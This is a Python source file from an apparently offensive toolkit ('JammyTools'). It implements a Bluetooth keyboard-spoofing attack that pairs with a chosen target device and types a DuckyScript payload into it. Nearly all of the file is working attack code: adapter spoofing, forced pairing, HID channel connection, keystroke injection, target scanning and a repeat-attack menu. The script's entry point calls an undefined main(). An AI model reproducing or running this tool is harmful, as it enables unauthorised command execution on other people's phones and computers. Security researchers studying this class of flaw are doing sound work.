# All credits to @pentestfunctions

#!/usr/bin/env python3
import subprocess
import sys
import time
import binascii
import logging
import re
import os
import bluetooth

from JammyTools.RedDucky.injector.hid import keyboard_report
from multiprocessing import Process
from JammyTools.RedDucky.injector.helpers import assert_address, log, run
from JammyTools.RedDucky.injector.client import KeyboardClient
from JammyTools.RedDucky.injector.adapter import Adapter
from JammyTools.RedDucky.injector.agent import PairingAgent
from JammyTools.RedDucky.injector.hid import Key
from JammyTools.RedDucky.injector.profile import register_hid_profile
from JammyTools.RedDucky.injector.ducky_convert import send_string, send_ducky_command
from JammyTools.RedDucky.injector.colors import cprint, iprint, wprint, cinput, RED, GREEN, WHITE, MAGENTA, BLUE, RESET, BRIGHT, CYAN, YELLOW, LIGHT_GREEN, BLACK, LIGHT_YELLOW, LIGHT_RED, LIGHT_BLUE, LIGHT_CYAN, LIGHT_MAGENTA, LIGHT_WHITE

current_command_index = 0

def initialize_bluetooth_adapter(interface, target):
    profile_proc = Process(target=register_hid_profile, args=(interface, target))
    profile_proc.start()

    adapter = Adapter(interface)
    try:
        adapter.set_name("FL0CK4H")
        adapter.set_class(0x002540)
        run(["hcitool", "name", target])
    except Exception as e:
        iprint(f"{YELLOW}Trying again due to error: {str(e)}")
        initialize_bluetooth_adapter(interface, target)

    return adapter, profile_proc

def connect_to_target(adapter, client, target):
    retry_count = 0
    max_retries = 5  
    while retry_count < max_retries:
        try:
            if not client.connect_sdp():
                log.error(f"{RED}Failed to connect to SDP, retrying...")
                retry_count += 1
                time.sleep(1)  # Wait for a bit before retrying
                continue

            adapter.enable_ssp()
            log.success(f"{GREEN}Connected to SDP (L2CAP 1) on target")
            with PairingAgent(adapter.iface, target):
                client.connect_hid_interrupt()
                client.connect_hid_control()
                time.sleep(1)  # Wait for connections to stabilize

                if client.c19.connected:
                    log.success(f"{GREEN}Connected to HID Interrupt (L2CAP 19) on target")
                    return True
                else:
                    log.error(f"{RED}Failed to connect to HID Interrupt, retrying...")
                    retry_count += 1
                    time.sleep(1)  # Wait for a bit before retrying

        except Exception as e:
            log.error(f"{RED}Exception occurred: {e}")
            retry_count += 1
            time.sleep(1)  # Wait for a bit before retrying

    log.error(f"{RED}Failed to connect after maximum retries")
    return False

def reconnect_hid_interrupt(client):
    retry_count = 0
    max_retry_count = 10
    while retry_count < max_retry_count:
        if client.connect_hid_interrupt():
            log.success(f"{GREEN}Connected to HID Interrupt (L2CAP 19) on target")
            return
        retry_count += 1
        log.debug(f"{YELLOW}Retry {retry_count} connecting to HID Interrupt")
        time.sleep(1)
    log.error(f"{RED}Failed to connect to HID Interrupt after maximum retries")

def execute_payload(adapter, client, filename, target):
    global current_command_index
    current_command_index = 0
    default_delay = 1  # Default delay in seconds

    # Define the Duckyscript to HID key code mapping
    duckyscript_to_hid = {
        'ENTER': Key.Enter,
        'GUI': Key.LeftMeta,  # Left Windows key
        'WINDOWS': Key.LeftMeta,
        'ALT': Key.LeftAlt,
        'CTRL': Key.LeftControl,
        'CONTROL': Key.LeftControl,
        'SHIFT': Key.LeftShift,
        'TAB': Key.Tab,
        'ESC': Key.Escape,
        'ESCAPE': Key.Escape,
        'INSERT': Key.Insert,
        'DELETE': Key.Delete,
        'HOME': Key.Home,
        'END': Key.End,
        'PAGEUP': Key.PageUp,
        'PAGEDOWN': Key.PageDown,
        'UP': Key.Up,
        'UPARROW': Key.Up,
        'DOWN': Key.Down,
        'DOWNARROW': Key.Down,
        'LEFT': Key.Left,
        'LEFTARROW': Key.Left,
        'RIGHT': Key.Right,
        'RIGHTARROW': Key.Right,
        'CAPSLOCK': Key.CapsLock,
        'NUMLOCK': Key.NumLock,
        'PRINTSCREEN': Key.PrintScreen,
        'SCROLLLOCK': Key.ScrollLock,
        'PAUSE': Key.Pause
    }

    with open(filename, 'r') as file:
        for line in file:
            line = line.strip()

    # Read and store all commands from the file
    with open(filename, 'r') as file:
        commands = [line.strip() for line in file.readlines()]

    while current_command_index < len(commands):
        line = commands[current_command_index]

        if line.startswith('REM') or not line:
            current_command_index += 1
            continue  # Skip comments and empty lines
        try:
            if line.startswith('DEFAULT_DELAY') or line.startswith('DEFAULTDELAY'):
                default_delay = float(line.split()[1]) / 1000
            elif line.startswith('DELAY'):
                delay_parts = line.split()
                delay_time = float(delay_parts[1]) / 1000 if len(delay_parts) > 1 else default_delay
                time.sleep(delay_time)
            elif line.startswith('STRING'):
                string_to_send = line.partition(' ')[2]
                send_string(client, string_to_send)
            elif '+' in line:
                send_ducky_command(client, line)
            else:
                log.debug(f"{BRIGHT}{MAGENTA}Processing command: {line}")  # Debugging log
                if line in duckyscript_to_hid:
                    key_code = duckyscript_to_hid[line]
                    log.debug(f"{BRIGHT}{LIGHT_WHITE}Sending keypress for {line}: {key_code}")  # Debugging log
                    client.send_keyboard_report(keyboard_report(key_code))
                    client.send_keyboard_report(keyboard_report())  # Key release
                else:
                    send_ducky_command(client, line)

                time.sleep(default_delay)

            current_command_index += 1

        except bluetooth.btcommon.BluetoothError as e:
            log.error(f"{RED}Bluetooth error occurred: {e}")
            if not reconnect_and_resume(adapter, client, target):
                break 
        except Exception as e:
            log.error(f"{RED}Unhandled exception: {e}")
            break

    if current_command_index >= len(commands):
        log.info(f"{BRIGHT}{CYAN}Payload execution completed.")

def reconnect_and_resume(adapter, client, target):
    global current_command_index
    log.info("Attempting to reconnect...")
    try:
        if connect_to_target(adapter, client, target):
            log.info(f"{BRIGHT}{GREEN}Reconnection successful, resuming payload execution")
            return True
        else:
            log.error(f"{RED}Failed to reconnect")
            return False
    except Exception as e:
        log.error(f"{RED}Error during reconnection: {e}")
        return False

def BlueDucky(target, interface):
    adapter = None
    profile_proc = None
    client = None
    try:
        assert_address(target)
        assert(re.match(r"^hci\d+$", interface))

        adapter, profile_proc = initialize_bluetooth_adapter(interface, target)
        client = KeyboardClient(target, auto_ack=True)

        if connect_to_target(adapter, client, target):
            log.status(f"{CYAN}Injecting payload")
            execute_payload(adapter, client, 'tools/RedDucky/payload.txt', target)
            profile_proc.terminate()
            client.close()


    except Exception as e:
        log.error(f"{RED}Unhandled exception: {e}")

    except KeyboardInterrupt as e:
        print("\n\nShutting down..")
        if profile_proc is not None:
            profile_proc.terminate()
            client.close()

def get_ret_interface():
    result = subprocess.run(['sudo', 'hciconfig'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8')

    pattern = r'(hci\d+).*?Bus:\s+(\S+).*?BD Address:\s+([0-9A-F:]+)'
    hci_details = re.findall(pattern, output, re.DOTALL)

    if not hci_details:
        print("No HCI interfaces found.")
        return None

    for i, (interface, bus, bd_addr) in enumerate(hci_details):
        cprint(f"{i}) {interface} - Bus: {bus}, BD Address: {bd_addr}")

    try:
        print("\n")
        selection = int(cinput("Enter the number of preffered hci interface"))
        if selection < 0 or selection >= len(hci_details):
            wprint("Invalid selection.")
            return get_ret_interface()
    except ValueError:
        wprint("Please enter a valid number.")
        time.sleep(2)
        return get_ret_interface()

    selected_interface = hci_details[selection][0]
    return selected_interface

def manage_savelist(action, target=None):
    path_to_saved_file = "tools/RedDucky/saved.txt"
    if action == "write":
        try:
            name = cinput("Remember device? (enter a name or leave empty for no)")
            if name == "" or name == "no":
                return
            if not os.path.exists(path_to_saved_file):
                with open(path_to_saved_file, "w") as f:
                    f.write("")
                    return
            
            with open(path_to_saved_file, "a") as f:
                f.write(f"{name}: {target}\n")

        except Exception as e:
            wprint(str(e))
    else:
        try:
            if not os.path.exists(path_to_saved_file):
                wprint(f"File does not exist/ Jammy couldn't find its path: saved.txt | {path_to_saved_file}")
                return

            with open(path_to_saved_file) as f:
                print(" ")
                data = f.read()
                cprint(f"""{BLUE}{BRIGHT}{data}""")
                return data
        except Exception as e:
            wprint(str(e))

def RedDucky():
    os.system('clear')
    interface = get_ret_interface()
    cprint(f"Chosen interface: {CYAN}{interface}")
    cprint("")
    cprint("1) Scan for targets")
    cprint("2) Attack a device")
    cprint("3) Modify payload")
    cprint("4) Modify saved")
    cprint("")
    choice_of_war = cinput("Enter option's number")
    if choice_of_war == "1":
        os.system(f"sudo btmgmt --index {interface.replace('hci', '')} power on")
        time.sleep(1)
        rq = cinput("Which tool to use? (1 - hcitool, 2 - spooftooph, 3 - bettercap)")
        if rq == "1":
            os.system(f"sudo hcitool -i {interface} scan")
        elif rq == "2":
            os.system("sudo spooftooph -i hci0 -s")
        elif rq == "3":
            os.system("sudo bettercap -eval 'ble.recon on'")
    elif choice_of_war == "3":
        # Determine the absolute path to the directory of the currently executing script
        btd_path = os.path.dirname(os.path.abspath(__file__))
        full_path = os.path.join(btd_path, "payload.txt")
        os.system(f"sudo nano {full_path}")
    elif choice_of_war == "4":
        # Determine the absolute path to the directory of the currently executing script
        btd_path = os.path.dirname(os.path.abspath(__file__))
        full_path = os.path.join(btd_path, "saved.txt")
        os.system(f"sudo nano {full_path}")

    data = manage_savelist("read")
    target = cinput(">> Enter target's address")
    target = target.replace(" ", "").replace("\n","")
    if target not in data:
        manage_savelist("write", target)
    BlueDucky(target, interface)
    outro = cinput("Press enter to skip or input 'r' to repeat the attack (rr to start over)")
    if outro == "r":
        BlueDucky(target, interface)
    elif outro == "rr":
        RedDucky()

if __name__ == "__main__":
    main()


